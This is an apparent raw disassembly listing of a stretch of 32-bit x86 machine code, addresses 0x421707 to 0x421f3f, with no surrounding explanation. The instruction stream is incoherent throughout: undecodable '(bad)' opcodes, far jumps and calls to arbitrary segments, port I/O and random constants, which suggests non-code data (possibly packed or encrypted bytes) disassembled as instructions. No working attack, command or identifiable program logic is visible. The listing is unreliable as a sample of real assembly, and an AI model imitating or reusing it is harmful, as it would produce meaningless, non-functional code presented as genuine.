  421707:	clc    
  421708:	and    al,0x30
  42170a:	loopne 0x42169e
  42170c:	add    DWORD PTR [eax],eax
  42170e:	sti    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [ebx-0x64f40b74],ch
  421717:	cmp    eax,0xc35cdb7c
  42171c:	inc    esi
  42171d:	and    ebp,ebp
  42171f:	inc    ebp
  421720:	call   0xfafcb620
  421725:	std    
  421726:	test   DWORD PTR [ebx],ebx
  421728:	mov    cl,dl
  42172a:	sbb    edx,DWORD PTR [ebx+edi*4]
  42172d:	sub    eax,0x4c4b1c9e
  421732:	sbb    edx,DWORD PTR [esi+0x7440a8f5]
  421738:	popf   
  421739:	xor    DWORD PTR [ecx],ebp
  42173b:	push   ds
  42173c:	rcl    BYTE PTR [edx+0x42d88d0],1
  421742:	mov    WORD PTR [edx],fs
  421744:	fimul  DWORD PTR [eax]
  421746:	loope  0x421775
  421748:	sbb    bl,BYTE PTR [ebx+0x5c]
  42174b:	bound  edi,QWORD PTR [edi-0xc]
  42174e:	out    dx,eax
  42174f:	mov    ecx,0x4d32b2b8
  421754:	mov    al,BYTE PTR [ebx]
  421756:	add    eax,0x88f6584a
  42175b:	mov    cl,0xbe
  42175d:	mov    BYTE PTR [edx],dl
  42175f:	and    eax,0xe2c2dc19
  421764:	cmp    bl,0x32
  421767:	cmp    edi,DWORD PTR [esi]
  421769:	int    0x32
  42176b:	mov    ecx,0x694f9d2a
  421770:	adc    edx,DWORD PTR [eax]
  421772:	jb     0x4217aa
  421774:	mov    ah,0x4d
  421776:	mov    al,ds:0x9ab33cd7
  42177b:	mov    esi,0xd6198e5a
  421780:	lods   al,BYTE PTR ds:[esi]
  421781:	into   
  421782:	fwait
  421783:	xchg   edx,eax
  421784:	lds    ebp,FWORD PTR [ebx-0xeffb5f4]
  42178a:	cwde   
  42178b:	ret    
  42178c:	sub    al,0xd9
  42178e:	push   edi
  42178f:	mov    edi,0xe5e6466e
  421794:	loop   0x4217d6
  421796:	pop    eax
  421797:	cmp    ch,ah
  421799:	adc    DWORD PTR [edx],ebp
  42179b:	sbb    al,0x34
  42179d:	imul   edx,DWORD PTR [ecx],0x56
  4217a0:	das    
  4217a1:	fisub  WORD PTR [eax+ecx*2-0x7193d1a3]
  4217a8:	and    bh,BYTE PTR [ebp+0x5d]
  4217ab:	sub    DWORD PTR [esi-0x38],ebp
  4217ae:	mov    ebp,0xcf48d854
  4217b3:	xor    eax,0xaa74ecb0
  4217b8:	punpckldq mm6,DWORD PTR [edx]
  4217bb:	or     eax,0xeee9aedc
  4217c0:	jo     0x421789
  4217c2:	jb     0x4217a7
  4217c4:	xchg   esp,eax
  4217c5:	pop    ss
  4217c6:	xchg   ebx,eax
  4217c7:	mov    eax,DWORD PTR [edx]
  4217c9:	test   DWORD PTR es:[esi-0x1a],edi
  4217cd:	ffree  st(2)
  4217cf:	jmp    0x3b83:0x89248530
  4217d6:	xor    esi,DWORD PTR [ebx]
  4217d8:	dec    eax
  4217d9:	push   0xffffffd4
  4217db:	jmp    0x6ca4:0xb8faafb5
  4217e2:	and    BYTE PTR [edi-0x19fea9d0],dl
  4217e8:	ds scas eax,DWORD PTR es:[edi]
  4217ea:	das    
  4217eb:	dec    edi
  4217ec:	dec    edx
  4217ed:	aad    0xcb
  4217ef:	xor    esp,DWORD PTR [eax-0x6ea2e1c9]
  4217f5:	dec    ebp
  4217f6:	(bad)  [ebp+0x3afe5a04]
  4217fc:	in     al,0x2b
  4217fe:	jmp    0xd68:0xf98f8334
  421805:	arpl   bp,bx
  421807:	rcr    BYTE PTR [edi+0x10],1
  42180a:	mov    dh,0xf1
  42180c:	xlat   BYTE PTR ds:[ebx]
  42180d:	mov    eax,ds:0xdb43d24c
  421812:	call   0x6d0d:0x2eee099e
  421819:	mov    ch,0xd
  42181b:	fisttp DWORD PTR ds:0xe198e4d5
  421821:	push   edx
  421822:	mov    bh,0xa
  421824:	pop    esi
  421825:	xchg   edx,eax
  421826:	nop
  421827:	in     al,0xeb
  421829:	mov    esp,0xa7021877
  42182e:	retf   
  42182f:	test   eax,0xb1742917
  421834:	add    ecx,eax
  421836:	cli    
  421837:	mov    ebp,0x2d3363d0
  42183d:	jp     0x4217fb
  42183f:	jno    0x421874
  421841:	imul   esi,edi,0x52613c99
  421847:	jp     0x42184d
  421849:	les    eax,FWORD PTR [eax+0x5a]
  42184c:	lahf   
  42184d:	mov    esi,0x7a1e6679
  421852:	pop    ss
  421853:	lods   eax,DWORD PTR ds:[esi]
  421854:	aas    
  421855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421856:	cmp    al,0x87
  421858:	ss jmp 0x46016bc5
  42185e:	xchg   esi,eax
  42185f:	xor    al,0x3c
  421861:	jmp    0x511f3258
  421866:	mov    ds:0x14550ef9,al
  42186b:	sub    eax,0x28767280
  421870:	ficomp DWORD PTR [edx-0x75]
  421873:	mov    bh,dl
  421875:	test   eax,0xd081aec4
  42187a:	retf   0x2326
  42187d:	retf   0x8cc1
  421880:	cmp    al,0x6f
  421882:	mov    gs,WORD PTR [edx]
  421884:	out    dx,al
  421885:	mov    ch,0xd4
  421887:	stos   BYTE PTR es:[edi],al
  421888:	aaa    
  421889:	mov    bl,0xea
  42188b:	sbb    al,0xbe
  42188d:	jge    0x421881
  42188f:	fild   DWORD PTR ds:0xfee0041c
  421895:	dec    edi
  421896:	fwait
  421897:	out    0xe5,al
  421899:	jp     0x42185f
  42189b:	loopne 0x42190e
  42189d:	mov    eax,ds:0xa8bb2464
  4218a2:	ja     0x42185d
  4218a4:	rol    BYTE PTR [edi-0x2e4515a9],0xc
  4218ab:	out    dx,al
  4218ac:	or     eax,0xbf026a74
  4218b1:	loope  0x4218be
  4218b3:	leave  
  4218b4:	neg    BYTE PTR [edx+0x34]
  4218b7:	jp     0x4218ba
  4218b9:	jns    0x4218db
  4218bb:	xchg   edx,eax
  4218bc:	jg     0x42188e
  4218be:	scas   al,BYTE PTR es:[edi]
  4218bf:	inc    edi
  4218c0:	adc    esp,DWORD PTR [eax-0x514900dc]
  4218c6:	sbb    eax,0xd6eb4b1d
  4218cb:	loope  0x4218bf
  4218cd:	cdq    
  4218ce:	and    bl,BYTE PTR [edi+ebp*1+0x2a]
  4218d2:	jg     0x4218a6
  4218d4:	jp     0x421919
  4218d6:	stos   BYTE PTR es:[edi],al
  4218d7:	jb     0x42185b
  4218d9:	inc    esp
  4218da:	ss and eax,0x15c7551e
  4218e0:	fimul  DWORD PTR [edx-0x337f9db]
  4218e6:	fisub  DWORD PTR [ebp-0x7988aecd]
  4218ec:	sbb    ebx,edi
  4218ee:	jbe    0x42189e
  4218f0:	arpl   WORD PTR [ebx],bp
  4218f2:	xchg   edx,eax
  4218f3:	dec    BYTE PTR [edi+0x76b84e6e]
  4218f9:	ror    BYTE PTR [esi],0x7c
  4218fc:	jle    0x503a59fc
  421902:	fld    DWORD PTR [eax-0x59]
  421905:	sub    al,0x90
  421907:	in     al,dx
  421908:	sub    BYTE PTR [edi-0x21],0xa2
  42190c:	icebp  
	...
  421919:	add    BYTE PTR [eax-0x4456c5cd],dh
  42191f:	test   eax,0x428f3bb3
  421924:	mov    esp,0xe6617c8a
  421929:	jge    0x421906
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	sti    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [eax-0x60],cl
  421934:	(bad)  
  421935:	mov    ch,0x58
  421937:	mov    ch,0x43
  421939:	ds cmp eax,0x6dc5c803
  42193f:	cmp    esp,DWORD PTR [ecx]
  421941:	shr    BYTE PTR [edx-0x45],1
  421944:	or     BYTE PTR [bx+di],bh
  421947:	mov    cl,0xa3
  421949:	ss mov ss,esi
  42194c:	icebp  
  42194d:	lahf   
  42194e:	sub    al,0xc4
  421950:	push   0xc38ac3f0
  421955:	fild   WORD PTR [ebp+0x38]
  421958:	retf   0x6297
  42195b:	push   cs
  42195c:	sbb    cl,BYTE PTR [esp+esi*2+0x204b537c]
  421963:	(bad)  
  421964:	ret    
  421965:	sub    BYTE PTR [ebp+0x50012595],0xb
  42196c:	data16 loop 0x42197c
  42196f:	ss pop ss
  421971:	pop    ax
  421973:	push   edx
  421974:	fs inc ebp
  421976:	adc    eax,0xd0004769
  42197b:	cmp    al,0xef
  42197d:	mov    ss,WORD PTR [edi+0x3b]
  421980:	push   esp
  421981:	jb     0x4219ab
  421983:	pop    ss
  421984:	outs   dx,BYTE PTR ds:[esi]
  421985:	sbb    ch,bl
  421987:	adc    bl,0x10
  42198a:	repnz mov eax,0xcbc40d30
  421990:	not    DWORD PTR [eax+eax*2]
  421993:	adc    ebp,esi
  421995:	shr    BYTE PTR [edi],0xea
  421998:	mov    al,0x0
  42199a:	imul   BYTE PTR [edx+esi*4]
  42199d:	mov    bl,0x42
  42199f:	icebp  
  4219a0:	xchg   esi,eax
  4219a1:	int    0x4c
  4219a3:	ret    
  4219a4:	sahf   
  4219a5:	mov    ah,BYTE PTR [ebp+edx*2+0xe]
  4219a9:	psubw  mm3,mm2
  4219ac:	outs   dx,BYTE PTR ds:[esi]
  4219ad:	cs dec esi
  4219af:	jb     0x421978
  4219b1:	inc    ebx
  4219b2:	inc    edx
  4219b3:	adc    esi,eax
  4219b5:	push   0xb3d09861
  4219ba:	sbb    eax,0x69c41d66
  4219bf:	pop    ebx
  4219c0:	nop
  4219c1:	push   edx
  4219c2:	lock sub edx,esp
  4219c5:	sbb    ebp,DWORD PTR [ebp-0x6e]
  4219c8:	mov    ch,0xd7
  4219ca:	shr    edi,0x2
  4219cd:	add    edi,DWORD PTR [edx]
  4219cf:	xchg   esp,eax
  4219d0:	dec    esp
  4219d1:	xchg   ebp,eax
  4219d2:	push   eax
  4219d3:	push   edi
  4219d4:	sub    al,0x43
  4219d6:	inc    ebp
  4219d7:	push   esi
  4219d8:	mov    eax,0xf7517659
  4219dd:	cdq    
  4219de:	(bad)  
  4219df:	sar    BYTE PTR [ebx+0x206d415b],0x8a
  4219e6:	xchg   BYTE PTR [esi],al
  4219e8:	or     eax,0xf2842232
  4219ed:	add    eax,0x2c3dc799
  4219f2:	mov    bh,0x9c
  4219f4:	mov    ebx,0xe597aa9f
  4219f9:	inc    edi
  4219fa:	lahf   
  4219fb:	pop    ebx
  4219fc:	add    DWORD PTR [esi],0x67
  4219ff:	test   al,0x3b
  421a01:	hlt    
  421a02:	pop    ebx
  421a03:	push   ss
  421a04:	cdq    
  421a05:	nop
  421a06:	jae    0x421a6f
  421a08:	les    ebp,FWORD PTR [ebx+0xf8460da]
  421a0e:	aaa    
  421a0f:	popa   
  421a10:	je     0x4219b2
  421a12:	cmp    ch,dh
  421a14:	pop    ds
  421a15:	mov    ecx,0x3d294372
  421a1a:	or     al,0x44
  421a1c:	inc    edi
  421a1d:	xchg   esp,eax
  421a1e:	test   BYTE PTR [ebp+0x3c],cl
  421a21:	pop    edx
  421a22:	int3   
  421a23:	dec    eax
  421a24:	jno    0x421a63
  421a26:	scas   al,BYTE PTR es:[edi]
  421a27:	or     esp,DWORD PTR [edi+0x15dd950f]
  421a2d:	ja     0x421a4b
  421a2f:	dec    ebp
  421a30:	es inc esp
  421a32:	inc    edi
  421a33:	fist   DWORD PTR [eax+0x3492e49c]
  421a39:	mov    esi,0xb1f0ab6b
  421a3e:	(bad)  
  421a3f:	les    ebx,FWORD PTR [ecx-0x7f]
  421a42:	(bad)  
  421a45:	mov    ds:0x19ce4a6d,al
  421a4a:	out    0x51,al
  421a4c:	out    dx,eax
  421a4d:	push   ds
  421a4e:	mov    ds:0xe04deada,al
  421a53:	call   0x1604d17
  421a58:	xor    bh,BYTE PTR [edx+0x1bd60567]
  421a5e:	aad    0xd
  421a60:	mov    al,0x92
  421a62:	adc    ecx,esi
  421a64:	jb     0x421adf
  421a66:	ror    ebp,cl
  421a68:	or     DWORD PTR [edi],edx
  421a6a:	xchg   esp,eax
  421a6b:	mov    BYTE PTR [edi],ah
  421a6d:	retf   
  421a6e:	clc    
  421a6f:	mov    dl,0xa4
  421a71:	pop    esp
  421a72:	cs inc edx
  421a74:	adc    al,0x79
  421a76:	or     BYTE PTR [eax+0xe],cl
  421a79:	stos   DWORD PTR es:[edi],eax
  421a7a:	dec    ecx
  421a7b:	stc    
  421a7c:	dec    esi
  421a7d:	mov    eax,0x1a74a194
  421a82:	inc    ebp
  421a83:	or     al,0x17
  421a85:	and    BYTE PTR [ebp-0x477ac5d],bh
  421a8b:	pop    edi
  421a8c:	(bad)  
  421a8d:	in     al,dx
  421a8e:	or     esi,0x7138d335
  421a94:	add    esp,DWORD PTR [ebp-0x71fa02b5]
  421a9a:	pop    ds
  421a9b:	pop    esi
  421a9c:	mov    eax,DWORD PTR ds:0xb89849c7
  421aa2:	pop    esi
  421aa3:	addr16 add ah,0xbf
  421aa7:	or     eax,0x88f85db0
  421aac:	pop    DWORD PTR [ebx-0x19]
  421aaf:	imul   ah
  421ab1:	ja     0x421ad3
  421ab3:	mov    bl,0xfe
  421ab5:	popf   
  421ab6:	mov    DWORD PTR [edx],eax
  421ab8:	lea    ecx,[ebx-0x557ad6bc]
  421abe:	lock pop es
  421ac0:	sbb    al,0x15
  421ac2:	outs   dx,BYTE PTR ds:[esi]
  421ac3:	enter  0xff0f,0x1
  421ac7:	jp     0x421ae4
  421ac9:	adc    eax,edx
  421acb:	aad    0xdd
  421acd:	pop    esp
  421ace:	loopne 0x421a86
  421ad0:	int3   
  421ad1:	xchg   esp,eax
  421ad2:	bound  ebx,QWORD PTR [esi]
  421ad4:	shl    al,cl
  421ad6:	(bad)  
  421ad7:	call   0xd54:0x3704ac32
  421ade:	std    
  421adf:	mov    al,0x9d
  421ae1:	out    0x96,al
  421ae3:	mov    edi,0x7b948622
  421ae8:	jg     0x421b5a
  421aea:	mov    bl,0xa3
  421aec:	push   0x39
  421aee:	xor    DWORD PTR [ecx+0x18d2e5bb],0x7bfc5dff
  421af8:	jecxz  0x421aa5
  421afa:	pushf  
  421afb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  421afd:	test   eax,0x5677073f
  421b02:	aad    0xc
  421b04:	xchg   esi,eax
  421b05:	push   eax
  421b06:	ja     0x421aa0
  421b08:	shl    DWORD PTR [ebp-0x30],cl
  421b0b:	mov    ah,0x21
  421b0d:	aad    0xce
  421b0f:	js     0x421b28
  421b11:	jecxz  0x421ac8
  421b13:	je     0x421ae4
  421b15:	bound  ebp,QWORD PTR [ebp+eax*2-0x17712d88]
  421b1c:	fnsave [ecx]
  421b1e:	call   0x42716b90
  421b23:	mov    ah,0xaa
  421b25:	pop    DWORD PTR [ecx-0x59]
  421b28:	inc    edx
  421b29:	cmp    al,0x14
  421b2b:	mov    ecx,0x19
	...
  421b38:	add    BYTE PTR [eax],al
  421b3a:	test   eax,0xff94c95e
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0xba22f8f7
  421b48:	adc    ch,BYTE PTR ds:0x196d6
  421b4e:	sti    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    bl,cl
  421b53:	cs dec ebx
  421b55:	mov    bl,0x40
  421b57:	and    eax,0x19c289ed
  421b5c:	lock sti 
  421b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b5f:	inc    edi
  421b60:	test   DWORD PTR [edi-0x79c61f6f],ecx
  421b66:	rol    DWORD PTR cs:[ebp+0x155d2533],cl
  421b6d:	xchg   edx,eax
  421b6e:	and    eax,0xd8051f0b
  421b73:	cmp    eax,0x59a1f206
  421b78:	jecxz  0x421bc6
  421b7a:	pusha  
  421b7b:	out    dx,al
  421b7c:	dec    edx
  421b7d:	es loopne 0x421b76
  421b80:	sbb    BYTE PTR [ebp+0x3a796860],bh
  421b86:	call   0x42547445
  421b8b:	mov    al,ds:0x104a0a76
  421b90:	adc    DWORD PTR [ebp-0x5f5f351d],edx
  421b96:	retf   
  421b97:	or     al,0xc
  421b99:	scas   al,BYTE PTR es:[edi]
  421b9a:	or     al,BYTE PTR [eax]
  421b9c:	mov    dh,0x67
  421b9e:	xchg   esp,eax
  421b9f:	enter  0x52e,0xa3
  421ba3:	ins    BYTE PTR es:[edi],dx
  421ba4:	and    eax,0x8f49725e
  421ba9:	mov    esi,0xe6dcec29
  421bae:	cmc    
  421baf:	in     eax,0x3
  421bb1:	cli    
  421bb2:	(bad)  
  421bb3:	sbb    edx,DWORD PTR [edx]
  421bb5:	jae    0x421bb4
  421bb7:	lahf   
  421bb8:	jae    0x421c2f
  421bba:	push   0x4b
  421bbc:	sub    dh,BYTE PTR [eax+ebx*4-0x2f]
  421bc0:	in     eax,dx
  421bc1:	cwde   
  421bc2:	pop    ss
  421bc3:	jae    0x421c42
  421bc5:	ins    BYTE PTR es:[edi],dx
  421bc6:	lods   al,BYTE PTR ds:[esi]
  421bc7:	clc    
  421bc8:	push   cs
  421bc9:	sti    
  421bca:	push   0xffffffc4
  421bcc:	loope  0x421b84
  421bce:	jp     0x421c07
  421bd0:	mov    eax,0xded39679
  421bd5:	and    ah,dh
  421bd7:	jb     0x421b94
  421bd9:	sbb    esp,DWORD PTR [ebp-0x55]
  421bdc:	data16 test BYTE PTR [ecx-0x39],bl
  421be0:	shl    DWORD PTR [esp+eax*1],0x5
  421be4:	push   edi
  421be5:	or     ebx,ecx
  421be7:	add    eax,0x7dfadd1d
  421bec:	mov    ecx,0xb19a1e6e
  421bf1:	push   0x45a8bf1b
  421bf6:	inc    edx
  421bf7:	or     eax,0xa0cfdf57
  421bfc:	retf   0x9788
  421bff:	mov    WORD PTR [edi+0x6f6ad8c0],ss
  421c05:	and    ch,BYTE PTR [eax]
  421c07:	add    edx,DWORD PTR [edi-0x26a8175a]
  421c0d:	xchg   ebp,esi
  421c0f:	into   
  421c10:	mov    DWORD PTR [ebx+0x16a941a9],ebp
  421c16:	sub    BYTE PTR [edx],bl
  421c18:	xor    ecx,DWORD PTR [edx+0x48a22d57]
  421c1e:	mov    BYTE PTR [ecx-0x31],cl
  421c21:	jbe    0x421c5f
  421c23:	adc    DWORD PTR [esi-0x746db444],edx
  421c29:	lods   al,BYTE PTR ds:[esi]
  421c2a:	or     DWORD PTR [ebx],ebx
  421c2c:	xchg   DWORD PTR fs:[ecx],edx
  421c2f:	in     eax,dx
  421c30:	inc    esp
  421c31:	fdiv   st(4),st
  421c33:	bound  esp,QWORD PTR [ecx*4+0x738e9b18]
  421c3a:	dec    esp
  421c3b:	mov    ah,0x3c
  421c3d:	fisubr DWORD PTR [edi+ecx*8-0x24]
  421c41:	(bad)  
  421c43:	sbb    edx,DWORD PTR [edx-0x57]
  421c46:	xchg   esi,eax
  421c47:	push   ds
  421c48:	push   ebx
  421c49:	shl    DWORD PTR [eax],cl
  421c4b:	jae    0x421c87
  421c4d:	mov    BYTE PTR [esp+ecx*2+0x7a],bl
  421c51:	ret    0x5eeb
  421c54:	cmp    cl,BYTE PTR [ecx+0x7929930]
  421c5a:	inc    ebp
  421c5b:	sub    al,0xb3
  421c5d:	inc    esp
  421c5f:	in     eax,dx
  421c60:	mov    edx,0x9a16a125
  421c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c66:	jmp    0x2e1f:0x979df69e
  421c6d:	or     DWORD PTR [ebp-0x34],esi
  421c70:	pushf  
  421c71:	jge    0x421c98
  421c73:	loopne 0x421c06
  421c75:	unpckhps xmm2,XMMWORD PTR [ebp+esi*4+0x16]
  421c7a:	stos   DWORD PTR es:[edi],eax
  421c7b:	xchg   esp,eax
  421c7c:	jb     0x421c7d
  421c7e:	or     BYTE PTR [ebx-0x5d],ah
  421c81:	daa    
  421c82:	jmp    0x9d07:0xfbd58aa1
  421c89:	mov    al,0x37
  421c8b:	add    BYTE PTR [esi-0x3],dl
  421c8e:	jmp    0x421cb6
  421c90:	sbb    eax,0x32c9326e
  421c95:	jae    0x421c36
  421c97:	push   eax
  421c98:	inc    ebp
  421c99:	push   0xe7d94767
  421c9e:	jecxz  0x421ca9
  421ca0:	mov    eax,ds:0x7d6e5285
  421ca5:	inc    ebp
  421ca6:	mov    al,ds:0xc7babc6f
  421cab:	std    
  421cac:	pushf  
  421cad:	pop    ds
  421cae:	xchg   edi,eax
  421caf:	mov    ds:0x234a7797,eax
  421cb4:	add    BYTE PTR [edx],al
  421cb6:	dec    edi
  421cb7:	lock bound ebp,QWORD PTR [ecx]
  421cba:	sahf   
  421cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cbd:	sub    al,0xd5
  421cbf:	retf   0xb78a
  421cc2:	ret    
  421cc3:	add    esi,edi
  421cc5:	push   ecx
  421cc6:	ss mov dl,0x15
  421cc9:	cmp    BYTE PTR [edx+0x53],dh
  421ccc:	int3   
  421ccd:	adc    ebp,DWORD PTR [edi]
  421ccf:	jmp    0x421d23
  421cd1:	pop    es
  421cd2:	fidiv  WORD PTR [ebx]
  421cd4:	scas   eax,DWORD PTR es:[edi]
  421cd5:	sub    al,BYTE PTR [esp+ebp*1+0xb]
  421cd9:	push   ebx
  421cda:	test   DWORD PTR [edx],edx
  421cdc:	or     al,0x37
  421cde:	sub    eax,DWORD PTR [esi-0x15c8a80b]
  421ce4:	bound  ebx,QWORD PTR [ecx]
  421ce6:	rcr    BYTE PTR [ecx],1
  421ce8:	mov    ecx,0x85cfdc3c
  421ced:	gs fist DWORD PTR ss:[esi+0x2f743d8]
  421cf5:	mov    ds:0xc6c72a,eax
  421cfa:	inc    edx
  421cfb:	imul   edi,DWORD PTR [bx+si],0xe962234c
  421d02:	and    ah,BYTE PTR [edx-0x61a5a5bb]
  421d08:	mov    eax,ds:0x649755fb
  421d0d:	scas   eax,DWORD PTR es:[edi]
  421d0e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d10:	push   ebx
  421d11:	jbe    0x421cd4
  421d13:	push   0xffffffde
  421d15:	popf   
  421d16:	int    0x34
  421d18:	inc    esp
  421d19:	clc    
  421d1a:	mov    dh,0xf2
  421d1c:	push   0x18
  421d1e:	push   esp
  421d1f:	adc    bl,BYTE PTR [esi-0x1e4d30ed]
  421d25:	jo     0x421ced
  421d27:	add    eax,0x63172e1d
  421d2c:	in     eax,dx
  421d2d:	inc    ebp
  421d2e:	adc    ebp,ecx
  421d30:	mov    es,esi
  421d32:	jle    0x421cca
  421d34:	pop    ds
  421d35:	xchg   edi,eax
  421d37:	clc    
  421d38:	fild   DWORD PTR [edi]
  421d3a:	and    eax,0x7cb8c3b7
  421d3f:	outs   dx,BYTE PTR ds:[esi]
  421d40:	scas   al,BYTE PTR es:[edi]
  421d41:	xchg   edi,eax
  421d42:	sahf   
  421d43:	mov    edx,0xa7cfd9e7
  421d48:	cmc    
  421d49:	mov    ds:0x939d91,al
	...
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	enter  0x907f,0x5
  421d6a:	rcr    DWORD PTR [eax+0x1fb0001],1
  421d70:	add    BYTE PTR [eax],al
  421d72:	xor    edx,ecx
  421d74:	jno    0x421d61
  421d76:	aas    
  421d77:	test   eax,0xd9bd80d3
  421d7c:	arpl   WORD PTR [edi-0x2e996465],bp
  421d82:	aam    0x63
  421d84:	sub    BYTE PTR [ebx],dh
  421d86:	int3   
  421d87:	jbe    0x421dfe
  421d89:	adc    ebx,esi
  421d8b:	adc    BYTE PTR [esi],al
  421d8d:	jo     0x421d20
  421d8f:	xchg   ebx,eax
  421d90:	lea    eax,ds:0xc8a7e424
  421d96:	mov    esp,DWORD PTR [ecx-0x6b2ac370]
  421d9c:	add    al,0xf9
  421d9e:	popa   
  421d9f:	or     DWORD PTR [esi],eax
  421da1:	mov    al,0xb7
  421da3:	push   0xc70951a0
  421da8:	push   0x18a0c6ce
  421dad:	add    eax,0xa9b6fd60
  421db2:	pop    edi
  421db3:	sub    DWORD PTR [ebx-0x58],ebp
  421db6:	lods   eax,DWORD PTR ds:[esi]
  421db7:	addr16 or eax,0xaa729812
  421dbd:	retf   
  421dbe:	sub    DWORD PTR [esi],edi
  421dc0:	sbb    eax,0x314edb1b
  421dc5:	outs   dx,DWORD PTR ds:[esi]
  421dc6:	dec    ebx
  421dc7:	in     eax,dx
  421dc8:	add    al,0x9
  421dca:	imul   edx,ebp,0xffffffbb
  421dcd:	aam    0x74
  421dcf:	sbb    dl,BYTE PTR [eax-0x3cefc2a1]
  421dd5:	js     0x421d75
  421dd7:	mov    ah,0x49
  421dd9:	mov    DWORD PTR [eax],0xa14967ae
  421ddf:	enter  0x30dc,0xc3
  421de3:	xor    BYTE PTR [edx],ch
  421de5:	es sbb bl,bh
  421de8:	cmc    
  421de9:	add    al,0xcd
  421deb:	jge    0x421e1a
  421ded:	mov    bl,0x9d
  421def:	test   DWORD PTR [ebx],esi
  421df1:	sbb    eax,0x3d055fb9
  421df6:	mov    DWORD PTR [esi],esi
  421df8:	mov    edi,ebx
  421dfa:	in     eax,dx
  421dfb:	and    eax,0x5f515cc2
  421e00:	nop
  421e01:	push   esp
  421e02:	sbb    eax,0x315714d0
  421e07:	mov    al,ds:0xba356615
  421e0c:	lahf   
  421e0d:	xor    dh,BYTE PTR fs:[eax]
  421e10:	icebp  
  421e11:	mov    cl,0x5e
  421e13:	dec    esp
  421e14:	sbb    eax,0xf30cb974
  421e19:	sbb    eax,ecx
  421e1b:	lock jecxz 0x421db5
  421e1e:	repz pop es
  421e20:	xor    esp,DWORD PTR [edi+0x1b]
  421e23:	ss adc eax,0xbf97be89
  421e2a:	mov    esp,0xb02d9bda
  421e2f:	pop    eax
  421e30:	rcl    DWORD PTR [esi+0x3ed393d2],cl
  421e36:	mov    esp,0x22dc8f11
  421e3b:	xchg   esp,eax
  421e3c:	(bad)  
  421e3d:	xor    eax,0x9a987c38
  421e42:	xor    eax,0x1ad57a2a
  421e47:	adc    eax,DWORD PTR [ecx]
  421e49:	pop    esi
  421e4a:	mov    edi,0x3ce00395
  421e4f:	jmp    0xda3227d7
  421e54:	push   ss
  421e55:	push   cs
  421e56:	pushf  
  421e57:	inc    DWORD PTR [eax+0x368cfe5e]
  421e5d:	stos   BYTE PTR es:[edi],al
  421e5e:	dec    ecx
  421e5f:	sti    
  421e60:	clc    
  421e61:	sbb    eax,0xb475442f
  421e66:	mov    ecx,0xeaa58217
  421e6b:	jge    0x421e9d
  421e6d:	cld    
  421e6e:	push   edx
  421e6f:	sub    DWORD PTR [ebp+0x10],0x31e5d08
  421e76:	rol    BYTE PTR [edi+0x47305edd],cl
  421e7c:	nop
  421e7d:	pop    edx
  421e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e7f:	ins    BYTE PTR es:[edi],dx
  421e80:	jb     0x421e94
  421e82:	ja     0x421e2e
  421e84:	sbb    dl,ch
  421e86:	adc    al,0x51
  421e88:	mov    ecx,0x1f42e486
  421e8d:	mov    al,0x74
  421e8f:	mov    ebx,0x6d6cd8ad
  421e94:	cmp    ah,ch
  421e96:	cmp    ebx,DWORD PTR [edx+0x59d5da23]
  421e9c:	pop    edx
  421e9d:	es loopne 0x421eb8
  421ea0:	cld    
  421ea1:	or     eax,0x45c069aa
  421ea6:	push   edx
  421ea7:	repnz adc ebp,DWORD PTR [eax+0x284cdd84]
  421eae:	leave  
  421eaf:	popa   
  421eb0:	daa    
  421eb1:	loopne 0x421e45
  421eb3:	std    
  421eb4:	push   edx
  421eb5:	adc    dl,BYTE PTR [esi]
  421eb7:	stos   BYTE PTR es:[edi],al
  421eb8:	add    al,BYTE PTR [edx]
  421eba:	cdq    
  421ebb:	test   DWORD PTR [ecx],ebx
  421ebd:	mov    gs,WORD PTR [esi]
  421ebf:	jmp    0x6059d366
  421ec4:	jns    0x421e60
  421ec6:	(bad)  
  421ec7:	out    dx,al
  421ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ec9:	jg     0x421f04
  421ecb:	imul   esp,DWORD PTR [ebp-0x5d892ae9],0x46713e7a
  421ed5:	mov    ebx,0x3e93768c
  421eda:	lea    ebx,[ecx+0x2b]
  421edd:	(bad)  
  421ede:	(bad)  
  421ee0:	imul   edx,DWORD PTR [edx],0x5d7af27a
  421ee6:	mov    eax,ds:0xd8a8cb79
  421eeb:	push   ebp
  421eec:	pop    ds
  421eed:	xchg   edi,eax
  421eee:	cmp    BYTE PTR [ebx+0x5d],bh
  421ef1:	xor    DWORD PTR [edi],edi
  421ef3:	xchg   BYTE PTR [edx+0x2e1b4a99],al
  421ef9:	test   eax,0xfd73ebda
  421efe:	ins    DWORD PTR es:[edi],dx
  421eff:	out    dx,al
  421f00:	lods   al,BYTE PTR ds:[esi]
  421f01:	mov    BYTE PTR [edi+0xd],bh
  421f04:	inc    esp
  421f05:	sbb    DWORD PTR [ecx+0x41],esi
  421f08:	push   edx
  421f09:	repnz push esp
  421f0b:	fwait
  421f0c:	ror    DWORD PTR [esi],1
  421f0e:	imul   esi,DWORD PTR [eax+eiz*1+0x6670baa5],0x426be373
  421f19:	pusha  
  421f1a:	retf   0x9f8
  421f1d:	sbb    edx,DWORD PTR [edi]
  421f1f:	inc    ebp
  421f20:	add    dh,BYTE PTR [ebx+0x58]
  421f23:	sub    eax,0x7377023f
  421f29:	xchg   ebx,eax
  421f2a:	push   ecx
  421f2b:	push   es
  421f2c:	retf   
  421f2d:	arpl   WORD PTR [edx],cx
  421f2f:	push   0x16
  421f31:	(bad)  
  421f32:	cmp    al,0xbc
  421f34:	call   0xdbb4:0x7d09bf29
  421f3b:	pop    ds
  421f3c:	mov    ah,0x73
  421f3e:	dec    eax
  421f3f:	ret    0xef25
